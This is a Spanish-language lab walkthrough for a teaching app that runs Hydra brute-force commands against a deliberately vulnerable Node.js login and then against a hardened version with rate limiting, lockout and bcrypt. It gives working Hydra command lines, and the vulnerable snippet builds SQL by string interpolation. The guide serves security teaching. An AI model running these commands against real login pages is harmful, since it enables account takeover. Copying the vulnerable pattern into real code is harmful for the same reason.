# Demo 3 — Brute Force en Login

## Concepto

Un ataque de fuerza bruta consiste en probar sistemáticamente combinaciones de contraseñas hasta dar con la correcta. Cuando una aplicación no tiene límite de intentos, un atacante puede usar herramientas automatizadas para probar miles de contraseñas por segundo.

**Vulnerabilidad en hacklab-vulnerable/server.js:**
```javascript
// ❌ INSEGURO: No hay ningún control sobre cuántas veces se puede intentar el login
app.post('/api/login', (req, res) => {
  // Cualquier IP puede hacer miles de peticiones sin restricción
  const query = `SELECT * FROM users WHERE username = '${username}'...`;
  ...
});
```

---

## Herramienta: Hydra

Hydra es una herramienta de cracking de contraseñas por fuerza bruta preinstalada en Kali Linux. Puede realizar cientos de intentos por segundo contra formularios web, SSH, FTP y muchos otros protocolos.

---

## Paso a paso del ataque

### Requisitos en Kali Linux

```bash
# Verificar que Hydra está disponible
hydra -h

# Verificar que rockyou.txt está disponible
ls /usr/share/wordlists/rockyou.txt

# Si está comprimido, descomprimir primero:
gunzip /usr/share/wordlists/rockyou.txt.gz
```

---

### Parte 1: Ataque contra la versión VULNERABLE (puerto 3000)

```bash
# Brute force con usuario conocido 'admin'
hydra -l admin \
  -P /usr/share/wordlists/rockyou.txt \
  HOST_IP \
  http-post-form \
  "/api/login:username=^USER^&password=^PASS^:Credenciales incorrectas" \
  -t 10 \
  -V \
  -f

# Parámetros explicados:
# -l admin        → usuario objetivo
# -P rockyou.txt  → lista de contraseñas
# HOST_IP         → IP del host Windows
# http-post-form  → tipo de formulario
# /api/login      → endpoint de login
# username=...    → formato del POST body
# :Credenciales incorrectas  → texto que aparece cuando FALLA
# -t 10           → 10 threads paralelos
# -V              → verbose (muestra cada intento)
# -f              → parar al encontrar la contraseña
```

**Resultado esperado:** Hydra encuentra la contraseña `admin123` del usuario admin en segundos (está en los primeros registros de rockyou.txt).

Para una demo más rápida, use una wordlist pequeña con las contraseñas conocidas:

```bash
# Crear wordlist pequeña para demo rápida
echo -e "abc123\npassword\n123456\nadmin123\nqwerty\nletmein\nsegura456" > /tmp/demo-passwords.txt

# Ejecutar hydra con la wordlist pequeña
hydra -l admin \
  -P /tmp/demo-passwords.txt \
  HOST_IP \
  http-post-form \
  "/api/login:username=^USER^&password=^PASS^:Credenciales incorrectas" \
  -t 4 -V -f
```

También puede atacar múltiples usuarios simultáneamente:

```bash
# Crear lista de usuarios
echo -e "admin\njlopez\nmgarcia\ncperez" > /tmp/users.txt

# Ataque con lista de usuarios y lista de contraseñas
hydra -L /tmp/users.txt \
  -P /tmp/demo-passwords.txt \
  HOST_IP \
  http-post-form \
  "/api/login:username=^USER^&password=^PASS^:Credenciales incorrectas" \
  -t 4 -V -f
```

---

### Parte 2: Repetir contra la versión SEGURA (puerto 4000)

```bash
hydra -l admin \
  -P /tmp/demo-passwords.txt \
  HOST_IP \
  http-post-form \
  "/api/login:username=^USER^&password=^PASS^:Credenciales incorrectas" \
  -t 4 -V -f \
  -s 4000
```

**Resultado esperado:** Hydra es bloqueado. El rate limiter permite máximo 5 intentos por IP en 15 minutos. A partir del 5to intento, la respuesta es:
```json
{"success": false, "message": "Demasiados intentos de acceso. Por favor espere 15 minutos."}
```

Además, si el ataque se hace directamente contra un usuario específico (sin rate limiter pero con muchos intentos), la cuenta se bloquea después de 5 intentos fallidos.

Puede verificarlo en los **logs del servidor** (ventana de terminal del servidor seguro):
```
[LOGIN] Intento fallido para "admin" (1/5)
[LOGIN] Intento fallido para "admin" (2/5)
[LOGIN] Intento fallido para "admin" (3/5)
[LOGIN] Intento fallido para "admin" (4/5)
[LOGIN] Intento fallido para "admin" (5/5) — CUENTA BLOQUEADA
```

---

## Protecciones implementadas en la versión segura

### 1. Rate Limiting (express-rate-limit)

```javascript
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // Ventana de 15 minutos
  max: 5,                    // Máximo 5 intentos por IP
  message: { success: false, message: 'Demasiados intentos...' }
});

app.post('/api/login', loginLimiter, async (req, res) => { ... });
```

### 2. Bloqueo de cuenta

```javascript
const newAttempts = user.failed_attempts + 1;
const shouldLock  = newAttempts >= 5;
db.prepare('UPDATE users SET failed_attempts = ?, locked = ? WHERE id = ?')
  .run(newAttempts, shouldLock ? 1 : 0, user.id);
```

### 3. bcrypt hace el ataque más lento

Incluso si el atacante obtiene el hash de la base de datos, bcrypt con 12 rounds toma ~250ms por intento, lo que hace inviable el cracking por fuerza bruta offline.

---

## Comparación

| Aspecto | Vulnerable (puerto 3000) | Seguro (puerto 4000) |
|---------|--------------------------|----------------------|
| Límite de intentos | Sin límite | 5 por IP cada 15 minutos |
| Bloqueo de cuenta | No | Sí, después de 5 intentos |
| Almacenamiento de contraseña | Texto plano | bcrypt hash (12 rounds) |
| Tiempo por intento | ~1ms | ~250ms (bcrypt) |
| Detección y logs | No | Sí, con registro de intentos |

---

## Referencias

- OWASP Top 10 A07:2021 — Identification and Authentication Failures
- OWASP Authentication Cheat Sheet
- Hydra documentation: `man hydra`
